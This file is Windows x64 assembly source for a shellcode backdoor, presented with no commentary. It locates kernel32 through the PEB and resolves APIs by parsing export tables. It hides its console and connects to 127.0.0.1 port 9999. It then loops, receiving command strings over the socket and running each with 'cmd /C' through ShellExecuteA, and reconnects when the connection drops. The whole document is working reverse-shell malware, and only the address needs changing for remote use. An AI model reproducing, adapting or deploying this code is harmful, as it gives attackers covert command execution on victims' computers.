global start

section .text

start: 
	mov rax, 8
	and rax, rsp
	test rax, rax
	je main_routine
	sub rsp, 8
	jmp main_routine
;----------------------------------------------------	
	strcmp:
	push rdx
	push rcx
	push rsi
	push rdi
	
	strcmp_loop:
		xor rax, rax
		mov al, byte [rcx]
		mov ah, byte [rdx]
		test al, al
		je break_strcmp_loop
		test ah, ah
		je break_strcmp_loop
		sub al, ah
		xor ah, ah
		inc rcx
		inc rdx
		test al, al
		je strcmp_loop
	
	break_strcmp_loop:
	pop rdi
	pop rsi
	pop rcx
	pop rdx
	ret 
;----------------------------------------------------
	main_routine:
	sub rsp, 2000h
	mov rax, gs:[30h]
	mov rax, ds:[rax + 60h]
	mov rax, [rax + 24]
	mov rax, [rax + 10h]
	mov rax, [rax]
	mov rax, [rax]
	mov rax, [rax + 30h]
	
	
	mov [rsp + 800h], rax ; kernel32 base
	mov rbx, [rsp + 800h]
	xor rax, rax
	mov al, [rbx + 0x3c]
	add rbx, rax
	add rbx, 4
	add rbx, 20
	add rbx, 112
	xor rax, rax
	mov eax, [rbx]
	add rax, [rsp + 800h]
	mov [rsp + 7f8h], rax ; export data directory VA
	mov rbx, [rsp + 7f8h]
	xor rdi, rdi
	mov edi, [rbx + 28]
	add rdi, [rsp + 800h] 
	mov [rsp + 7f0h], rdi ;; export address VA 
	xor rsi, rsi
	mov esi, [rbx + 32]
	add rsi, [rsp + 800h] ; name pointer VA
	xor rdi, rdi
	mov edi, DWORD  [rbx + 36]
	add rdi, [rsp + 800h] ; orinal table
	xor rax, rax
	mov [rsp], rax ; count variable
	
	findFunctionLoop:
		xor rcx, rcx
		mov ecx, [rsi]
		add rcx, [rsp + 800h]
		mov rax, 41797261h
		mov [rsp + 200h], rax
		mov rax, 7262694c64616f4ch
		mov [rsp + 1f8h], rax
		lea rdx, [rsp + 1f8h]
		call strcmp
		test rax, rax
		jne findGetProcAddress
		mov rax, [rsp]
		inc rax
		mov [rsp], rax
		xor rax, rax
		mov ax, [rdi]
		shl rax, 2
		add rax, [rsp + 7f0h]
		xor rbx, rbx
		mov ebx, [rax]
		add rbx, [rsp + 800h]
		mov [rsp + 7e8h], rbx ; LoadLibraryA VA
		jmp breakFindFunctionLoop
		
		findGetProcAddress:
		xor rcx, rcx
		mov ecx, [rsi]
		add rcx, [rsp + 800h]
		mov rax, 737365726464h
		mov [rsp + 200h], rax
		mov rax, 41636f7250746547h
		mov [rsp + 1f8h], rax
		lea rdx, [rsp + 1f8h]
		call strcmp
		test rax, rax
		jne breakFindFunctionLoop 
		mov rax, [rsp]
		inc rax
		mov [rsp], rax
		xor rax, rax
		mov ax, [rdi]
		shl rax, 2
		add rax, [rsp + 7f0h]
		xor rbx, rbx
		mov ebx, [rax]
		add rbx, [rsp + 800h]
		mov [rsp + 7e0h], rbx ; GetProcAddress VA
		
		breakFindFunctionLoop:
		mov rax, [rsp]
		add rsi, 4
		add rdi, 2
		cmp rax, 2
		jl findFunctionLoop
		
	mov rax, 6c6ch
	mov [rsp + 200h], rax
	mov rax, 642e32335f327357h
	mov [rsp + 1f8h], rax
	lea rcx, [rsp + 1f8h]
	mov rax, [rsp + 7e8h]
	call rax 
	mov [rsp + 7d8h], rax ; Ws2_32.dll HANDLE
	
	mov rcx, [rsp + 7d8h]
	mov rax, 4174h
	mov [rsp + 200h], rax 
	mov rax, 656b636f53415357h
	mov [rsp + 1f8h], rax
	lea rdx, [rsp + 1f8h]
	mov rax, [rsp + 7e0h]
	call rax
	mov [rsp + 7d0h], rax ; WSASocketA()
	
	mov rcx, [rsp + 7d8h]
	mov rax, 7463656e6e6f63h
	mov [rsp + 200h], rax
	lea rdx, [rsp + 200h]
	mov rax, [rsp + 7e0h]
	call rax
	mov [rsp + 7c8h], rax ; connect()
	
	mov rcx, [rsp + 7d8h]
	mov rax, 76636572h
	mov [rsp + 200h], rax
	lea rdx, [rsp + 200h]
	mov rax, [rsp + 7e0h]
	call rax 
	mov [rsp + 7c0h], rax ; recv()
	
	mov rax, 6c6c64h
	mov [rsp + 200h], rax
	mov rax, 2e32336c6c656853h
	mov [rsp + 1f8h], rax
	lea rcx, [rsp + 1f8h]
	mov rax, [rsp + 7e8h]
	call rax
	mov [rsp + 7b8h], rax ; Shell32.dll HANDLE
	
	mov rcx, [rsp + 7b8h]
	mov rax, 4165747563h
	mov [rsp + 200h], rax
	mov rax, 6578456c6c656853h
	mov [rsp + 1f8h], rax
	lea rdx, [rsp + 1f8h]
	mov rax, [rsp + 7e0h]
	call rax
	mov [rsp + 7b0h], rax ; ShellExecuteA()
	
	mov rcx, [rsp + 800h]
	mov rax, 656c6fh
	mov [rsp + 200h], rax
	mov rax, 736e6f4365657246h
	mov [rsp + 1f8h], rax
	lea rdx, [rsp + 1f8h]
	mov rax, [rsp + 7e0h]
	call rax
	mov [rsp + 7a8h], rax ; FreeConsole()
	
	mov rcx, [rsp + 7d8h]
	mov rax, 74656bh
	mov [rsp + 200h], rax
	mov rax, 636f7365736f6c63h
	mov [rsp + 1f8h], rax
	lea rdx, [rsp + 1f8h]
	mov rax, [rsp + 7e0h]
	call rax
	mov [rsp + 7a0h], rax ; closesocket()
	
	mov rcx, [rsp + 7d8h]
	mov rax, 7075h
	mov [rsp + 200h], rax
	mov rax, 7472617453415357h
	mov [rsp + 1f8h], rax
	lea rdx, [rsp + 1f8h]
	mov rax, [rsp + 7e0h]
	call rax
	mov [rsp + 708h], rax ; WSAStartup()
;----------------------------------------------------
; FreeConsole()
	
	mov rax, [rsp + 7a8h]
	call rax
	
;----------------------------------------------------
; WSASocketA(2, 1, 6, NULL, 0, 1);
	backdoorLoop:
		xor rcx, rcx
		mov cx, 0202h
		lea rdx, [rsp + 1000h] ; WSADATA pointer, 198h byte length
		mov rax, [rsp + 708h]
		call rax
		test rax, rax
		jne backdoorLoop
	
		mov rcx, 2
		mov rdx, 1
		mov r8, 6
		xor r9, r9
		xor rax, rax
		mov [rsp], rax
		inc rax
		mov [rsp + 8], rax
		mov rax, [rsp + 7d0h]
		sub rsp, 0x20
		call rax
		add rsp, 0x20
		cmp rax, 0xffffffffffffffff
		je backdoorLoop
		
		mov [rsp + 600h], rax ; save SOCKET
		mov rcx, rax
		xor rax, rax
		mov [rsp + 400h], rax
		xor rax, rax
		mov eax, 0100007fh
		mov DWORD  [rsp + 3fch], eax ; 127.0.0.1
		xor rax, rax
		mov ax, 0f27h
		mov WORD  [rsp + 3fah], ax ; port 9999
		xor rax, rax
		mov ax, 2
		mov WORD  [rsp + 3f8h], ax ; AF_INET
		lea rdx, [rsp + 3f8h]
		mov r8, 10h
		mov rax, [rsp + 7c8h]
		call rax
		test rax, rax
		je waitForCommand
		jmp clean
		
		waitForCommand:
			lea r12, [rsp + 1000h]
			getCharUntilEnd:
				mov r13, rsp
				sub r13, 1000h
				cmp r12, r13
				je ExecuteCommand
				mov rcx, [rsp + 600h]
				mov rdx, r12
				mov r8, 1
				mov r9, 8
				mov rax, [rsp + 7c0h]
				call rax
				test rax, rax
				je waitForCommand
				cmp rax, -1
				je clean
				xor rax, rax
				mov al, BYTE  [r12]
				test al, al
				je ExecuteCommand
				cmp al, 0ah
				je ExecuteCommand
				inc r12
				jmp getCharUntilEnd
				
			ExecuteCommand:
				xor rax, rax
				mov BYTE  [r12], al
				mov rcx, 0
				mov rax, 6e65706fh
				mov [rsp + 200h], rax
				lea rdx, [rsp + 200h]
				mov rax, 646d63h ; cmd
				mov [rsp + 1f8h], rax
				lea r8, [rsp + 1f8h]
				mov rax, 20432f0000000000h ; /C
				mov [rsp + 0ff8h], rax
				lea r9, [rsp + 0ff8h + 5]
				xor rax, rax
				mov [rsp], rax
				mov [rsp + 08h], rax
				mov rax, [rsp + 7b0h]
				sub rsp, 0x20
				call rax
				add rsp, 0x20
				jmp waitForCommand				
				
			
		
		clean:
		mov rcx, [rsp + 600h]
		mov rax, [rsp + 7a0h]
		call rax ; release socket
		jmp backdoorLoop
		
		
		